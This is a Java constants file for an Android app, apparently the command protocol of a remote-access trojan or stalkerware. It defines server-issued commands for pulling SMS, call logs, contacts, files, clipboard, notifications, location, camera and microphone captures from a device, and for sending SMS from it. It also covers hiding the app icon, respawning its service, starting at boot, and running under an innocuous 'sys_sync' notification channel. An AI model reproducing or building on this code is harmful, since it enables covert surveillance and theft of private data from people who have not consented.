package com.fason.app.core;

/**
 * Central protocol constants. All event names, command codes, action strings,
 * JSON keys, broadcast actions, and preference keys live here.
 */
public final class Protocol {

    private Protocol() {}

    // Socket events (server → device)
    public static final String EVT_PING  = "ping";
    public static final String EVT_ORDER = "order";

    // Socket events (device → server)
    public static final String EVT_PONG = "pong";

    // Channel codes
    public static final String FILES       = "0xFI";
    public static final String SMS         = "0xSM";
    public static final String CALLS       = "0xCL";
    public static final String CONTACTS    = "0xCO";
    public static final String MIC         = "0xMI";
    public static final String LOCATION    = "0xLO";
    public static final String WIFI        = "0xWI";
    public static final String PERMISSIONS = "0xPM";
    public static final String APPS        = "0xIN";
    public static final String PERM_CHECK  = "0xGP";
    public static final String CAMERA      = "0xCA";
    public static final String CLIPBOARD   = "0xCB";
    public static final String NOTIF       = "0xNO";
    public static final String FASON       = "0xFM";
    public static final String INFO        = "0xIF";

    // Actions
    public static final String ACT_LS            = "ls";
    public static final String ACT_DL            = "dl";
    public static final String ACT_SEND_SMS      = "sendSMS";
    public static final String ACT_LIST          = "list";
    public static final String ACT_CAPTURE       = "capture";
    public static final String ACT_START         = "start";
    public static final String ACT_STOP          = "stop";
    public static final String ACT_FETCH         = "fetch";
    public static final String ACT_STATUS        = "status";
    public static final String ACT_REQUEST       = "request";
    public static final String ACT_HIDE          = "hide";
    public static final String ACT_SHOW          = "show";
    public static final String ACT_UNHIDE        = "unhide";
    public static final String ACT_OPEN_SETTINGS = "open_settings";

    // JSON keys — request
    public static final String KEY_TYPE   = "type";
    public static final String KEY_ACTION = "action";
    public static final String KEY_PATH   = "path";
    public static final String KEY_TO     = "to";
    public static final String KEY_SMS    = "sms";
    public static final String KEY_SEC    = "sec";
    public static final String KEY_PERM   = "perm";
    public static final String KEY_ID     = "id";
    public static final String KEY_SYS    = "sys";

    // JSON keys — response (common)
    public static final String KEY_ERROR     = "error";
    public static final String KEY_SUCCESS   = "success";
    public static final String KEY_TOTAL     = "total";
    public static final String KEY_TIMESTAMP = "timestamp";
    public static final String KEY_NAME      = "name";
    public static final String KEY_SIZE      = "size";
    public static final String KEY_ENABLED   = "enabled";
    public static final String KEY_STATUS    = "status";
    public static final String KEY_MESSAGE   = "message";

    // JSON keys — file response
    public static final String KEY_LIST          = "list";
    public static final String KEY_ISDIR         = "isDir";
    public static final String KEY_LAST_MODIFIED = "lastModified";
    public static final String KEY_BUFFER        = "buffer";
    public static final String KEY_TRANSFER_ID   = "transferId";
    public static final String KEY_TOTAL_CHUNKS  = "totalChunks";
    public static final String KEY_TOTAL_SIZE    = "totalSize";
    public static final String KEY_CHUNK_INDEX   = "chunkIndex";
    public static final String KEY_CHUNK_DATA    = "chunkData";

    // File download types (KEY_TYPE values in file responses)
    public static final String TYPE_LIST           = "list";
    public static final String TYPE_DOWNLOAD       = "download";
    public static final String TYPE_DOWNLOAD_START = "download_start";
    public static final String TYPE_DOWNLOAD_CHUNK = "download_chunk";
    public static final String TYPE_DOWNLOAD_END   = "download_end";
    public static final String TYPE_ERROR          = "error";

    // JSON keys — SMS response
    public static final String KEY_SMS_LIST = "smslist";
    public static final String KEY_ADDRESS  = "address";
    public static final String KEY_BODY     = "body";
    public static final String KEY_DATE     = "date";
    public static final String KEY_READ     = "read";

    // JSON keys — calls response
    public static final String KEY_CALLS_LIST = "callsList";
    public static final String KEY_PHONE_NO   = "phoneNo";
    public static final String KEY_DURATION   = "duration";

    // JSON keys — contacts response
    public static final String KEY_CONTACTS_LIST = "contactsList";

    // JSON keys — camera response
    public static final String KEY_IMAGE     = "image";
    public static final String KEY_CAMERA_ID = "cameraId";
    public static final String KEY_CAM_LIST  = "camList";
    public static final String KEY_HAS_PERM  = "hasPermission";

    // JSON keys — mic response
    public static final String KEY_FILE = "file";

    // JSON keys — location response
    public static final String KEY_LATITUDE  = "latitude";
    public static final String KEY_LONGITUDE = "longitude";
    public static final String KEY_ACCURACY  = "accuracy";
    public static final String KEY_SPEED     = "speed";
    public static final String KEY_PROVIDER  = "provider";

    // JSON keys — WiFi response
    public static final String KEY_NETWORKS        = "networks";
    public static final String KEY_CACHED           = "cached";
    public static final String KEY_BSSID            = "BSSID";
    public static final String KEY_SSID             = "SSID";
    public static final String KEY_LEVEL            = "level";
    public static final String KEY_FREQUENCY        = "frequency";
    public static final String KEY_SIGNAL_STRENGTH  = "signalStrength";
    public static final String KEY_CAPABILITIES     = "capabilities";
    public static final String KEY_SECURE           = "secure";
    public static final String KEY_CHANNEL          = "channel";
    public static final String KEY_WIFI6            = "wifi6";

    // JSON keys — clipboard response
    public static final String KEY_TEXT      = "text";
    public static final String KEY_LENGTH    = "length";
    public static final String KEY_LABEL     = "label";
    public static final String KEY_MIME_TYPE = "mimeType";

    // JSON keys — app list response
    public static final String KEY_APPS          = "apps";
    public static final String KEY_APP_NAME      = "appName";
    public static final String KEY_PACKAGE_NAME  = "packageName";
    public static final String KEY_VERSION_NAME  = "versionName";
    public static final String KEY_VERSION_CODE  = "versionCode";
    public static final String KEY_IS_SYSTEM     = "isSystem";
    public static final String KEY_TARGET_SDK    = "targetSdkVersion";

    // JSON keys — notification response
    public static final String KEY_CONNECTED = "connected";
    public static final String KEY_REMOVED   = "removed";
    public static final String KEY_TITLE     = "title";
    public static final String KEY_CONTENT   = "content";
    public static final String KEY_POST_TIME = "postTime";
    public static final String KEY_TAG       = "tag";
    public static final String KEY_ONGOING   = "ongoing";
    public static final String KEY_CLEARABLE = "clearable";
    public static final String KEY_INITIAL   = "initial";
    public static final String KEY_CATEGORY  = "category";

    // JSON keys — permission response
    public static final String KEY_PERMISSION  = "permission";
    public static final String KEY_ALLOWED     = "allowed";
    public static final String KEY_PERMISSIONS = "permissions";

    // JSON keys — fason (app visibility) response
    public static final String KEY_HIDDEN = "hidden";
    public static final String KEY_STATE  = "state";

    // Broadcast actions
    public static final String BC_KEEP_ALIVE     = "keepAlive";
    public static final String BC_RESPAWN_SERVICE = "respawnService";
    public static final String BC_RESTART         = "restart";
    public static final String BC_QUICKBOOT       = "android.intent.action.QUICKBOOT_POWERON";
    public static final String BC_HTC_QUICKBOOT   = "com.htc.intent.action.QUICKBOOT_POWERON";

    // SharedPreferences
    public static final String PREFS_NAME              = "fason_prefs";
    public static final String PREF_SERVICE_ACTIVE     = "service_active";
    public static final String PREF_AUTOSTART_PROMPTED = "autostart_prompted";

    // Notification channel & group
    public static final String NOTIF_CHANNEL = "sys_sync";
    public static final String NOTIF_GROUP   = "sys_group";

    // WorkManager
    public static final String WORK_KEEP_ALIVE = "KeepAliveWork";

    // Settings.Secure keys
    public static final String SETTING_NOTIF_LISTENERS = "enabled_notification_listeners";

    // FasonManager component suffix
    public static final String ALIAS_SUFFIX = ".ui.MainActivityAlias";
}
